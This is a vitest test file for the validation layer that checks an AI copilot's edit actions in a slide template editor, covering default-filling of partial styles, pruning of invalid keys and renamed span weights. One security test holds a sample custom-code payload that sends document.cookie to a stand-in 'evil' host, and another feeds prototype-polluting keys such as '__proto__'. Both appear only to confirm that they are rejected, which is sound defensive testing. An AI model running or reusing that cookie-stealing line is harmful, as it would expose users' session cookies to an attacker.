import { describe, it, expect } from 'vitest';
import { zAgentAction, validateFreeElementPatch } from './agentActions';
import { defaultTagStyle, defaultSwipeStyle, defaultTextBox } from '@/app/components/templateEditorTypes';

// The copilot sends a NEW tag/swipe with only the fields it means to set and OMITS the boilerplate the
// full style schema requires. Before the default-fill, the strict branch rejected those partials and the
// whole "add a NEWS tag" action was silently dropped — verified live: Gemini emits
// {bgColor,textColor,fontSize,fontWeight,cornerRadius,paddingX,paddingY,textCase} and leaves out
// borderColor/borderWidth/borderOpacity/italic/letterSpacing. fillNewElementDefaults (agentActions.ts)
// fills those from the editor's own factories BEFORE strict validation. These tests pin all three of the
// properties that make that safe: partials APPLY, real model values WIN, and bad VALUES still get rejected.

function parseAdd(element: unknown) {
  return zAgentAction.safeParse({ type: 'add_free_element', slideId: 's1', element });
}

// zNewFreeElement's type is a NON-distributed Omit<union,'id'>, which collapses to the shared keys, so
// `.style` isn't visible statically even after a `.kind` guard (the runtime IS a real discriminated union).
// These aliases recover the per-branch style shape for the assertions below.
type TagStyleT = ReturnType<typeof defaultTagStyle>;
type SwipeStyleT = ReturnType<typeof defaultSwipeStyle>;

// The exact partial tag Gemini produced live for "add a NEWS tag" (no border/italic/letterSpacing).
const partialTag = {
  kind: 'tag', text: 'NEWS', x: 540, y: 100, width: 120, height: 36,
  style: { bgColor: '#ffffff', bgOpacity: 100, cornerRadius: 4, textColor: '#1a1a1a', fontSize: 16, fontWeight: 700, fontLabel: 'Inter', paddingX: 12, paddingY: 6, textCase: 'upper' },
};

describe('add_free_element — new tag/swipe fill omitted style fields from the editor defaults', () => {
  it('accepts a partial tag that omits border/italic/letterSpacing (this exact shape was dropped before)', () => {
    expect(parseAdd(partialTag).success).toBe(true);
  });

  it('fills the omitted fields from defaultTagStyle()', () => {
    const r = parseAdd(partialTag);
    if (!r.success || r.data.type !== 'add_free_element' || r.data.element.kind !== 'tag') throw new Error('did not validate as a tag add');
    const s = (r.data.element as unknown as { style: TagStyleT }).style;
    const d = defaultTagStyle();
    expect({ borderColor: s.borderColor, borderWidth: s.borderWidth, borderOpacity: s.borderOpacity, italic: s.italic, letterSpacing: s.letterSpacing })
      .toEqual({ borderColor: d.borderColor, borderWidth: d.borderWidth, borderOpacity: d.borderOpacity, italic: d.italic, letterSpacing: d.letterSpacing });
  });

  it("keeps the model's values over the defaults where they differ (merge is default←model)", () => {
    // Every field here DIFFERS from the default, so a spread-order regression to {...style,...defaults}
    // — defaults clobbering the model — would flip at least one and fail this.
    const d = defaultTagStyle();
    const overrides = { bgColor: '#123456', textColor: '#abcdef', fontSize: d.fontSize + 7, cornerRadius: d.cornerRadius + 11, fontWeight: 400 as const, paddingX: d.paddingX + 3 };
    const r = parseAdd({ kind: 'tag', text: 'X', x: 0, y: 0, width: 10, height: 10, style: overrides });
    if (!r.success || r.data.type !== 'add_free_element' || r.data.element.kind !== 'tag') throw new Error('did not validate as a tag add');
    expect((r.data.element as unknown as { style: TagStyleT }).style).toMatchObject(overrides);
  });

  it('STILL rejects a genuinely bad value — the fill is not a blanket .passthrough()', () => {
    // fontSize must be a number; the default-fill must not paper over a wrong-typed value the model sent.
    expect(parseAdd({ kind: 'tag', text: 'X', x: 0, y: 0, width: 10, height: 10, style: { fontSize: 'big' } }).success).toBe(false);
  });

  it('accepts a near-empty tag (only text + box) — the entire style defaults in', () => {
    expect(parseAdd({ kind: 'tag', text: 'LIVE', x: 0, y: 0, width: 80, height: 30 }).success).toBe(true);
  });

  it('fills a partial swipe from defaultSwipeStyle() while keeping the sent fields', () => {
    const r = parseAdd({ kind: 'swipe', x: 0, y: 0, width: 100, height: 30, style: { text: 'SWIPE NOW', textColor: '#ffffff' } });
    if (!r.success || r.data.type !== 'add_free_element' || r.data.element.kind !== 'swipe') throw new Error('did not validate as a swipe add');
    const sw = (r.data.element as unknown as { style: SwipeStyleT }).style;
    expect(sw.arrowType).toBe(defaultSwipeStyle().arrowType);  // default filled
    expect(sw.text).toBe('SWIPE NOW');                         // model value kept
  });
});

describe('the default-fill is confined to the ADD path — patches stay partial', () => {
  // A tag PATCH must remain a genuine partial: filling defaults here would silently reset a tag's border/
  // padding/etc. every time the copilot nudged one field. The fill lives only in the add-element schema,
  // so a single-field patch validates AND carries only that field.
  it('accepts a one-field tag patch without demanding the whole style', () => {
    expect(validateFreeElementPatch('tag', { style: { bgColor: '#16a34a' } })).toBeNull();
  });
  it('still rejects a bad-typed value in a patch', () => {
    expect(validateFreeElementPatch('tag', { style: { fontSize: 'big' } })).not.toBeNull();
  });
});

function parsePatchSlide(settings: unknown) {
  return zAgentAction.safeParse({ type: 'patch_slide', slideId: 's1', settings });
}
function settingsOf(r: ReturnType<typeof parsePatchSlide>): Record<string, unknown> {
  if (!r.success || r.data.type !== 'patch_slide') throw new Error('not a patch_slide');
  return (r.data.settings ?? {}) as Record<string, unknown>;
}

describe('patch_slide settings — resilient patch keeps the valid keys, drops the bad ones', () => {
  // Live, the model routinely mixes a hallucinated key or a mistyped value into an otherwise-good restyle.
  // The whole action used to be dropped over that one key; now the good keys apply and the bad ones vanish.
  it('keeps a real key and prunes an invented one (the restyle no longer dies over one bad key)', () => {
    const r = parsePatchSlide({ fontSize: 88, fadeColor: '#ffffff' });   // fadeColor is not a settings key
    expect(r.success).toBe(true);
    expect(settingsOf(r)).toEqual({ fontSize: 88 });
  });

  it('prunes a mistyped known key (fadeFloor as a string) and keeps the rest', () => {
    const r = parsePatchSlide({ canvasColor: '#0f172a', fadeFloor: '0%' });
    expect(r.success).toBe(true);
    expect(settingsOf(r)).toEqual({ canvasColor: '#0f172a' });
  });

  it('renames a span run\'s fontWeight→weight so the run survives instead of dropping headlineSpans', () => {
    const r = parsePatchSlide({ headlineSpans: [{ text: 'Big' , fontWeight: 800 }, { text: ' news' }] });
    expect(r.success).toBe(true);
    expect(settingsOf(r).headlineSpans).toEqual([{ text: 'Big', weight: 800 }, { text: ' news' }]);
  });

  it('an all-invalid settings object collapses to an empty (no-op) patch, not a rejection', () => {
    const r = parsePatchSlide({ madeUp: 1, alsoFake: 2 });
    expect(r.success).toBe(true);
    expect(settingsOf(r)).toEqual({});
  });
});

describe('SECURITY — the resilient patch must NOT become a code-injection bypass', () => {
  // The pruning logic drops fields that fail validation. freeElements is the one field that can carry
  // (excluded) custom draw-code — so it must FAIL CLOSED: a custom payload rejects the whole action rather
  // than being quietly pruned while the rest of the restyle sails through. This is the load-bearing test.
  it('custom draw-code in freeElements rejects the WHOLE action, even next to a valid key', () => {
    const r = parsePatchSlide({
      fontSize: 88,
      freeElements: [{ kind: 'custom', id: 'e', x: 0, y: 0, width: 10, height: 10, elementId: 'z', name: 'y', code: 'fetch("//evil/"+document.cookie)' }],
    });
    expect(r.success).toBe(false);   // NOT success-with-code-pruned
  });

  it('a valid non-custom freeElements array is RETAINED, not just accepted', () => {
    // Teeth: asserting only success===true passes even against the raw schema (verified via review) — so
    // it can't catch a prune/over-reject regression that drops the array to an empty {} patch. Assert it survives.
    const r = parsePatchSlide({ freeElements: [{ kind: 'tag', id: 'e', x: 0, y: 0, width: 100, height: 40, text: 'NEW', style: defaultTagStyle() }] });
    expect(r.success).toBe(true);
    expect(settingsOf(r).freeElements as unknown[]).toHaveLength(1);
  });
});

describe('new items — an echoed id is stripped instead of failing the add', () => {
  it('add_free_element drops an id the model copied from the state', () => {
    const r = parseAdd({ id: 'tag_1', kind: 'tag', text: 'X', x: 0, y: 0, width: 10, height: 10 });
    expect(r.success).toBe(true);
    if (!r.success || r.data.type !== 'add_free_element') throw new Error('not an add');
    expect('id' in (r.data.element as Record<string, unknown>)).toBe(false);
  });

  it('add_image_box tolerates an echoed id (given a real url + the required fields)', () => {
    const r = zAgentAction.safeParse({ type: 'add_image_box', slideId: 's1',
      imageBox: { id: 'img_1', url: 'https://in-state/x.png', x: 0, y: 0, width: 100, height: 100, opacity: 100, cornerRadius: 0 } });
    expect(r.success).toBe(true);
  });
});

describe('patch_slide settings — hardening against adversarial/edge keys (surfaced by adversarial review)', () => {
  it('a settings key that collides with an Object.prototype member is DROPPED, never thrown', () => {
    // shape[k] for "toString"/"constructor"/"__proto__" resolves to a prototype member (truthy, no
    // .safeParse) — a naive lookup throws "field.safeParse is not a function". Object.hasOwn guards it.
    for (const bad of ['toString', 'constructor', '__proto__', 'hasOwnProperty', 'valueOf']) {
      const r = parsePatchSlide(JSON.parse(`{"${bad}":1,"canvasColor":"#000000"}`));   // JSON.parse → own key
      expect(r.success, `${bad} should not throw`).toBe(true);
      expect(settingsOf(r)).toEqual({ canvasColor: '#000000' });
    }
  });

  it('freeElements:null is a benign clear — pruned while the rest applies (not a whole-action rejection)', () => {
    const r = parsePatchSlide(JSON.parse('{"freeElements":null,"canvasColor":"#000000"}'));
    expect(r.success).toBe(true);
    expect(settingsOf(r)).toEqual({ canvasColor: '#000000' });
  });

  it('a span carrying BOTH weight and fontWeight keeps weight and drops the stray fontWeight', () => {
    const r = parsePatchSlide({ headlineSpans: [{ text: 'Hi', weight: 700, fontWeight: 800 }] });
    expect(r.success).toBe(true);
    expect(settingsOf(r).headlineSpans).toEqual([{ text: 'Hi', weight: 700 }]);
  });
});

describe('new text box — style defaults fill in and real text disables the placeholder filler', () => {
  it('accepts a sparse text box (fills opacity/lineHeight/letterSpacing) and turns off fillPlaceholder for real text', () => {
    const r = zAgentAction.safeParse({ type: 'add_text_box', slideId: 's1', textBox: { text: 'Real caption', x: 100, y: 100, width: 400, height: 120 } });
    expect(r.success).toBe(true);
    if (!r.success || r.data.type !== 'add_text_box') throw new Error('not a text box add');
    expect(r.data.textBox.fillPlaceholder).toBe(false);   // else the box would render lorem instead of the caption
  });

  it('RESPECTS an explicit fillPlaceholder:true sent with real text (does not override the model to false)', () => {
    // Pins the `!('fillPlaceholder' in tb)` guard: an unconditional `= false` would flip this.
    const r = zAgentAction.safeParse({ type: 'add_text_box', slideId: 's1', textBox: { text: 'Real', fillPlaceholder: true, x: 0, y: 0, width: 400, height: 120 } });
    if (!r.success || r.data.type !== 'add_text_box') throw new Error('not a text box add');
    expect(r.data.textBox.fillPlaceholder).toBe(true);
  });

  it('leaves the placeholder filler ON for a whitespace-only text box (renders lorem, not empty)', () => {
    // Pins the `wroteText` guard: dropping it would force false and blank the box.
    const r = zAgentAction.safeParse({ type: 'add_text_box', slideId: 's1', textBox: { text: '   ', x: 0, y: 0, width: 400, height: 120 } });
    if (!r.success || r.data.type !== 'add_text_box') throw new Error('not a text box add');
    expect(r.data.textBox.fillPlaceholder).toBe(true);
  });
});

describe('text-box span runs get the same fontWeight→weight rename (surfaced by review)', () => {
  it('add_text_box with a fontWeight span is accepted and the run is renamed to weight', () => {
    const r = zAgentAction.safeParse({ type: 'add_text_box', slideId: 's1', textBox: { text: 'Hi', x: 0, y: 0, width: 10, height: 10, spans: [{ text: 'Hi', fontWeight: 700 }] } });
    expect(r.success).toBe(true);
    if (!r.success || r.data.type !== 'add_text_box') throw new Error('not a text box add');
    expect(r.data.textBox.spans).toEqual([{ text: 'Hi', weight: 700 }]);
  });

  it('patch_text_box with a fontWeight span is accepted (was rejected before)', () => {
    const r = zAgentAction.safeParse({ type: 'patch_text_box', slideId: 's1', id: 'tb1', patch: { spans: [{ text: 'Hi', fontWeight: 700 }] } });
    expect(r.success).toBe(true);
  });

  it('settings.textBoxes whole-array with a fontWeight span is NOT silently pruned to a no-op', () => {
    const box = { ...defaultTextBox(), spans: [{ text: 'Hi', fontWeight: 700 }] };
    const r = parsePatchSlide({ textBoxes: [box] });
    expect(r.success).toBe(true);
    expect(settingsOf(r).textBoxes as unknown[]).toHaveLength(1);   // was [] — silent success no-op — before the fix
  });
});
